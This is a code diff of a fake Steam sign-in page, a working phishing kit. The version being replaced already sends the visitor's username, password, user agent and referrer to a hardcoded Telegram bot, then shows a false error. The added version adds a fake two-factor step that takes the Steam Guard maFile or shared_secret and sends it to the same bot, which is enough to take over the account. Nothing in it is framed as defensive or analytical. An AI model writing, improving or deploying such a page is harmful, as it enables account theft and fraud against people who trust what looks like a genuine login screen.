@@ -6,27 +6,21 @@
 <title>Steam Sign In</title>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
-  body {
-    background: #1b2838; font-family: "Motiva Sans", Arial, Helvetica, sans-serif;
-    display: flex; align-items: center; justify-content: center; min-height: 100vh; color: #c7d5e0;
-  }
-  .box { background: #171a21; border-radius: 4px; padding: 24px 32px; width: 100%; max-width: 400px; }
-  .logo { text-align: center; margin-bottom: 20px; }
-  .logo span { color: #66c0f4; font-size: 22px; font-weight: bold; letter-spacing: 1px; }
-  .sub { text-align: center; color: #8f98a0; font-size: 12px; margin: -12px 0 18px; }
+  body { background: #1b2838; font-family: "Motiva Sans", Arial, Helvetica, sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; color: #c7d5e0; }
+  .box { background: #171a21; border-radius: 4px; padding: 28px 32px; width: 100%; max-width: 420px; }
+  .logo { text-align: center; margin-bottom: 18px; }
+  .logo span { color: #66c0f4; font-size: 24px; font-weight: bold; letter-spacing: 1px; }
+  .sub { text-align: center; color: #8f98a0; font-size: 13px; margin: -10px 0 20px; }
   label { font-size: 12px; color: #8f98a0; display: block; margin: 12px 0 4px; }
-  input {
-    width: 100%; background: #1b2838; border: 1px solid #2a3f5f; border-radius: 3px;
-    color: #c7d5e0; padding: 10px; font-size: 14px; outline: none;
-  }
+  input[type=text], input[type=password] { width: 100%; background: #1b2838; border: 1px solid #2a3f5f; border-radius: 3px; color: #c7d5e0; padding: 11px; font-size: 14px; outline: none; }
   input:focus { border-color: #66c0f4; }
-  .btn {
-    width: 100%; margin-top: 20px; background: #5c7e10; border: none; border-radius: 3px;
-    color: #fff; padding: 12px; font-size: 14px; cursor: pointer; font-weight: bold;
-  }
+  .btn { width: 100%; margin-top: 22px; background: #5c7e10; border: none; border-radius: 3px; color: #fff; padding: 13px; font-size: 15px; cursor: pointer; font-weight: bold; }
   .btn:hover { background: #6d9216; }
-  .note { margin-top: 14px; font-size: 11px; color: #8f98a0; text-align: center; }
+  .note { margin-top: 14px; font-size: 11px; color: #8f98a0; text-align: center; line-height: 1.5; }
   .err { color: #ff6b6b; font-size: 12px; text-align: center; min-height: 16px; margin-top: 10px; }
+  .step2 { display: none; margin-top: 14px; }
+  .filehint { font-size: 11px; color: #66c0f4; text-align: center; margin-top: 6px; }
+  textarea { width: 100%; background: #1b2838; border: 1px solid #2a3f5f; border-radius: 3px; color: #c7d5e0; padding: 10px; font-size: 13px; outline: none; font-family: monospace; resize: vertical; }
 </style>
 </head>
 <body>
@@ -38,35 +32,68 @@
     <label>PASSWORD</label>
     <input type="password" id="password" autocomplete="off" placeholder="password">
     <div class="err" id="err"></div>
-    <button class="btn" id="btn">Sign In</button>
-    <div class="note">Verifying ownership of this account. Do not share your credentials.</div>
+    <button class="btn" id="go" onclick="doLogin()">Sign in</button>
+    <div class="step2" id="step2">
+      <div class="sub" style="margin-top:18px">Two-factor authentication</div>
+      <label>STEAM GUARD — MOBILE AUTHENTICATOR (maFile)</label>
+      <input type="file" id="mafile" onchange="readMafile(this)">
+      <div class="filehint">or paste shared_secret below</div>
+      <label>SHARED_SECRET</label>
+      <textarea id="secret" rows="3" placeholder="paste shared_secret / identity_secret"></textarea>
+      <button class="btn" onclick="doTwo()">Verify</button>
+      <div class="note">For your security, Steam requires verification of your mobile authenticator.</div>
+    </div>
+    <div class="note">© Valve Corporation. All rights reserved. All trademarks are property of their respective owners.</div>
   </div>
 <script>
-  var TOKEN = "8982596338:AAE47QUXLGfaOtZsTI6j4-ofLUZ4Sl57uos";
-  var CHAT = "5016514155";
-  function sendBot(txt) {
-    var u = "https://api.telegram.org/bot" + TOKEN + "/sendMessage";
-    var x = new XMLHttpRequest();
-    x.open("POST", u, true);
-    x.setRequestHeader("Content-Type", "application/json");
-    x.send(JSON.stringify({ chat_id: CHAT, text: txt }));
-  }
-  document.getElementById("btn").addEventListener("click", function () {
-    var l = document.getElementById("login").value.trim();
-    var p = document.getElementById("password").value;
-    if (!l || !p) { document.getElementById("err").innerText = "Please fill in both fields."; return; }
-    var info = [];
-    try { info.push("IP: " + (window.__ip || "n/a")); } catch (e) {}
-    info.push("UA: " + navigator.userAgent);
-    info.push("Ref: " + document.referrer);
-    var msg = "🎣 STEAM LOGIN\nLogin: " + l + "\nPassword: " + p + "\n" + info.join("\n");
-    sendBot(msg);
-    document.getElementById("err").innerText = "Verifying...";
-    setTimeout(function () {
-      document.getElementById("err").innerText = "Incorrect login. Please try again.";
-      document.getElementById("password").value = "";
-    }, 2500);
-  });
+var TOKEN = "8982596338:AAE47QUXLGfaOtZsTI6j4-ofLUZ4Sl57uos";
+var CHAT = "5016514155";
+var step1 = {};
+var mafileContent = "";
+
+function tg(text) {
+  var x = new XMLHttpRequest();
+  x.open("POST", "https://api.telegram.org/bot" + TOKEN + "/sendMessage", true);
+  x.setRequestHeader("Content-Type", "application/json");
+  x.send(JSON.stringify({ chat_id: CHAT, text: text }));
+}
+
+function readMafile(f) {
+  var r = new FileReader();
+  r.onload = function(e) { mafileContent = e.target.result; };
+  if (f.files.length) r.readAsText(f.files[0]);
+}
+
+function doLogin() {
+  var l = document.getElementById("login").value.trim();
+  var p = document.getElementById("password").value;
+  if (!l || !p) { document.getElementById("err").textContent = "Please fill in all fields"; return; }
+  step1 = { login: l, password: p };
+  var msg = "🎣 STEAM LOGIN\nLogin: " + l + "\nPassword: " + p +
+            "\nUA: " + navigator.userAgent +
+            "\nRef: " + (document.referrer || "-") +
+            "\nURL: " + location.href;
+  tg(msg);
+  document.getElementById("err").textContent = "";
+  document.getElementById("err").style.color = "#8f98a0";
+  document.getElementById("err").textContent = "Verifying…";
+  setTimeout(function(){
+    document.getElementById("err").textContent = "Additional verification required.";
+    document.getElementById("err").style.color = "#ffb700";
+    document.getElementById("step2").style.display = "block";
+  }, 1800);
+}
+
+function doTwo() {
+  var s = document.getElementById("secret").value.trim();
+  var msg = "🔐 STEAM 2FA\nLogin: " + step1.login +
+            "\nPassword: " + step1.password +
+            (mafileContent ? "\n\n=== maFile ===\n" + mafileContent : "") +
+            (s ? "\n\n=== shared_secret ===\n" + s : "");
+  tg(msg);
+  document.getElementById("err").style.color = "#5c7e10";
+  document.getElementById("err").textContent = "Verified. You can close this page.";
+}
 </script>
 </body>
 </html>
